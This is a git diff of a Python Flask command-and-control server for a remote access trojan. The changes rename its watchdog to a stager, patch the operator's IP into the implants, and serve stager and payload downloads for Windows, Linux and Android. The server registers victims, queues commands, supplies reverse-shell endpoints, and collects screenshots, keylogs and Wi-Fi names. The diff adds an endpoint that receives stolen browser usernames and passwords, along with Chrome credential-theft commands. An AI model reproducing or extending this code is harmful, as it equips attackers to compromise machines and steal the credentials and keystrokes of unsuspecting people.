@@ -4,14 +4,13 @@ from flask import Flask , request, redirect, render_template , sessions, session
 from werkzeug.utils import secure_filename
 from werkzeug.datastructures import  FileStorage
 import os
-import apext_db
+import main_db
 from datetime import date
 import subprocess
 
 # PAYLOAD UPDATE 
 # ADMIN LOGIN PAGE
 # TEAM SHARE PANEL
-
 
 app = Flask(__name__, static_folder='{0}/static'.format(os.getcwd()), template_folder='{0}/templates'.format(os.getcwd()))
 app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
@@ -68,31 +67,31 @@ if platform.uname()[0] == "Linux":
 elif platform.uname()[0] == "Windows":
     print("function not completed yet")
         
-### CHANGE WATCHDOG.PY AND PAYLOAD.PY MASTER IP ###
+### CHANGE STAGER.PY AND PAYLOAD.PY MASTER IP ###
 linelist = []
 linelist2 = []
 
-with open("./watchdog.py", "r+") as watchdogfile:
-    for line in watchdogfile.readlines():
+with open("./stager.py", "r+") as stagerfile:
+    for line in stagerfile.readlines():
         linelist.append(line)
-with open("./watchdog.py", "w") as watchdogfile:
+with open("./stager.py", "w") as stagerfile:
     for line in linelist:
         if line == '_WEB_SERVER =\n':
-            watchdogfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
+            stagerfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
         else:
-            watchdogfile.write(line)
-    watchdogfile.close()
+            stagerfile.write(line)
+    stagerfile.close()
     
-with open("./payload.py", "r+") as watchdogfile:
-    for line in watchdogfile.readlines():
+with open("./payload.py", "r+") as stagerfile:
+    for line in stagerfile.readlines():
         linelist2.append(line)
-with open("./payload.py", "w") as watchdogfile:
+with open("./payload.py", "w") as stagerfile:
     for line in linelist2:
         if line == '_WEB_SERVER =\n':
-            watchdogfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
+            stagerfile.write('_WEB_SERVER = "{0}:{1}"\n'.format(ip, port))
         else:
-            watchdogfile.write(line)
-    watchdogfile.close()
+            stagerfile.write(line)
+    stagerfile.close()
 
 print("""  _____            _         _               
  |  __ \          | |       (_)              
@@ -111,23 +110,23 @@ print("""  _____            _         _
 import time
 time.sleep(3)
 
-### needed for eval command from watchdog ###
+### needed for eval command from stager ###
 _SERVER = "{0}:{1}".format(ip, port)
 
 ### UNFINISHED HTML GUI C&C ###
 @app.route('/admin')
 def mainn():
     rats = []
-    for rat in apext_db.get_rat_list():
+    for rat in main_db.get_rat_list():
         print(rat)
         rats.append(rat)
     return render_template("admin.html".format(os.getcwd()), rats=rats)
 
 ### LINUX WATHCDOG DOWNLOAD ###
-@app.route('/downloads/linux/watchdog')
-def download_linux_watchdog():
+@app.route('/downloads/linux/stager')
+def download_linux_stager():
     print(request.user_agent.string)
-    return send_file('./static/linux/watchdog', as_attachment=True)
+    return send_file('./static/linux/stager', as_attachment=True)
 
 ### LINUX PAYLOAD DOWNLOAD ###
 @app.route('/downloads/linux/payload')
@@ -141,11 +140,11 @@ def download_linzzux_payload():
     print(request.user_agent.string)
     return send_file("./static/linux/zz.apk", as_attachment=True)
 
-### WINDOWS WATCHDOG DOWNLOAD ###
-@app.route('/downloads/windows/watchdog')
-def download_windows_watchdog():
+### WINDOWS STAGER DOWNLOAD ###
+@app.route('/downloads/windows/stager')
+def download_windows_stager():
     print(request.user_agent.string)
-    return send_file('./static/windows/watchdog.exe', as_attachment=True)
+    return send_file('./static/windows/stager.exe', as_attachment=True)
 
 ### WINDOWS PAYLOAD DOWNLOAD ###
 @app.route('/downloads/windows/payload')
@@ -169,8 +168,10 @@ def register(ip, user, os, uuid):
         today = date.today()
         _REGISTERED_DATE = today.strftime("%m/%d/%y")
         _LAST_SEEN_DATE = today.strftime("%m/%d/%y")
-        apext_db.register(ip, user, os, _REGISTERED_DATE, _LAST_SEEN_DATE, uuid)
-        apext_db.create_user_wifilisttable(uuid)
+        main_db.register(ip, user, os, _REGISTERED_DATE, _LAST_SEEN_DATE, uuid)
+        #main_db.create_user_credentials(uuid.replace('-', ''))
+        #main_db.create_user_keylog_table(uuid.replace('-', ''))
+        main_db.create_user_wifilisttable(uuid)
         print('created users')
         return 'none'
 
@@ -181,11 +182,13 @@ def check_if_registered(ip, user, uuid):
     try:
         if ip == "None":
             return 0
-        if apext_db.check_rat_exists(ip, user, uuid) != None:
+        if main_db.check_rat_exists(ip, user, uuid) != None:
             print('he exists')
             print(request.remote_addr)
+            print('true')
             return 'True'
         else:
+            print('fffrue')
             return 'False'
 
     except TypeError:
@@ -195,23 +198,25 @@ def check_if_registered(ip, user, uuid):
 @app.route('/command/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
 def command(ip, user,  uuid):
     today = date.today()
-    command = '{0}'.format(apext_db.get_user_command(ip, user, uuid))
-    apext_db.remove_user_command(ip, user,  uuid)
-    apext_db.update_user_lastseendate(ip, user, uuid, today.strftime("%m/%d/%y"))
+    command = '{0}'.format(main_db.get_user_command(ip, user, uuid))
+    main_db.remove_user_command(ip, user,  uuid)
+    main_db.update_user_lastseendate(ip, user, uuid, today.strftime("%m/%d/%y"))
     print(command)
     return command
 
+### INSERT KEYLOGS INTO DATABASE ###
 @app.route('/keylogger/<ip>/<user>/<uuid>/<log>', methods=['POST', 'GET'])
 def keylogger(ip, user,  uuid, log):
     print(log)
+    main_db.insert_user_keylog(uuid, log)
     
-    return "asdasd"
+    return "None"
 
 ### CHECK FOR A MASS COMMAND LINK ###
 @app.route('/mass/<ip>/<user>', methods=['POST', 'GET'])
 def mass_(ip, user): 
-    command = '{0}'.format(apext_db.get_user_command(ip, user))
-    apext_db.remove_user_command(ip, user)
+    command = '{0}'.format(main_db.get_user_command(ip, user))
+    main_db.remove_user_command(ip, user)
     print(command)
     return command
 
@@ -219,14 +224,25 @@ def mass_(ip, user):
 
 @app.route('/wifi_name/<uuid>/<wifi_name>', methods=['POST', 'GET'])
 def insert_wifi_name(uuid, wifi_name):
-    apext_db.insert_user_wifi(uuid, wifi_name)
+    main_db.insert_user_wifi(uuid, wifi_name)
     print('created ')
+
+@app.route('/browser_creds/<uuid>/<site_name>/<username>/<password>', methods=['POST', 'GET'])
+def insert_browser_creds(uuid, site_name, username, password):
+    main_db.insert_user_credentials(uuid, site_name, username, password)
+
+    print(site_name)
+    print(username)
+    print(password)
+
+    return 'nothing'
+    
 
 ### REVERSE SHELL, CHECK FOR A SERVER ###
 @app.route('/rshell/<ip>/<user>/<uuid>', methods=['POST', 'GET'])
 def rshell_(ip, user,  uuid): 
-    master_ip = '{0}'.format(apext_db.get_rshell_master(ip, user,  uuid))
-    master_port = '{0}'.format(apext_db.get_rshell_master_port(ip, user,  uuid))
+    master_ip = '{0}'.format(main_db.get_rshell_master(ip, user,  uuid))
+    master_port = '{0}'.format(main_db.get_rshell_master_port(ip, user,  uuid))
     return master_ip + " " + master_port
 
 ### GET YOUR IP ###
@@ -283,7 +299,7 @@ def information_grabber(key):
 def upload_screenshot(ip, user, uuid): 
     if request.method == 'POST':
         try:
-            if apext_db.check_rat_exists(ip, user, uuid) != None:
+            if main_db.check_rat_exists(ip, user, uuid) != None:
                 print("screenshot user exists")
                 f = request.files['file']
                 filename = secure_filename(f.filename)
@@ -432,6 +448,8 @@ def wait_for_command():
         if command == "getwifi":
             if _OS == "Linux":
                 pass
+        
+        
             
             elif _OS == "Windows":
                 meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
@@ -457,6 +475,22 @@ def wait_for_command():
             elif _OS == "Windows":
                 t1 = threading.Thread(None, start_keylogger)
                 t1.start()
+        
+        if command == "get_chrome":
+            if _OS == "Linux":
+                pass
+            
+            elif _OS == "Windows":
+                t1 = threading.Thread(None, get_chrome_credentials)
+                t1.start()
+        
+        if command == "tv_youtube":
+            if _OS == "Linux":
+                pass
+            
+            elif _OS == "Windows":
+                t1 = threading.Thread(None, get_chrome_credentials)
+                t1.start()
                 
     
             
@@ -469,6 +503,7 @@ def wait_for_command():
 def exec_command(command):
     cmd = shlex.split(command)
     subprocess.call(cmd)
+    
 
 username = getpass.getuser()
 if username == 'root':
@@ -534,4 +569,3 @@ def start_keylogger():
 """
 
 app.run(host=ip, port=port, threaded=True)
-
